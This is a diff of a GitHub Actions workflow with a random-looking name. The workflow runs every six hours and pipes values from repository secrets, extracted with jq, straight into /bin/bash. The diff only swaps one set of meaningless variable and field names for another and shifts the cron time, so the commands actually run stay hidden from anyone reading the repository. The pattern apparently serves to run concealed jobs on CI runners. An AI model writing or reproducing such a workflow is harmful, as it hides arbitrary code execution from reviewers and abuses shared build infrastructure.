@@ -1,24 +1,23 @@
 name: wangwenyuan9371
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 3/6 * * *'
+    - cron: '16 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: wangwenyuan9371
         env:
-          i83005: ${{ secrets.i83005 }}
+          tc5781: ${{ secrets.tc5781 }}
         run: |
-          echo $i83005 | jq -r .fi1807 | /bin/bash
-          echo $zu05 | jq -r .i3631 | /bin/bash
-          echo $qs33 | jq -r .mufp38714 | /bin/bash
-          echo $ean940 | jq -r .kugw24769 | /bin/bash
-          echo $g47 | jq -r .xfgbc51 | /bin/bash
-          echo $ihik42 | jq -r .rryhm4867 | /bin/bash
-          echo $l61 | jq -r .xagvu8990 | /bin/bash
+          echo $tc5781 | jq -r .yl19876 | /bin/bash
+          echo $se4 | jq -r .e4712 | /bin/bash
+          echo $nywgr0647 | jq -r .w0610 | /bin/bash
+          echo $y13728 | jq -r .wsnpc5 | /bin/bash
+          echo $qmc39 | jq -r .so60945 | /bin/bash
+          echo $sp564 | jq -r .qe2 | /bin/bash
+          echo $gcj2 | jq -r .b46 | /bin/bash
+          echo $jq02718 | jq -r .pnr6832 | /bin/bash
 
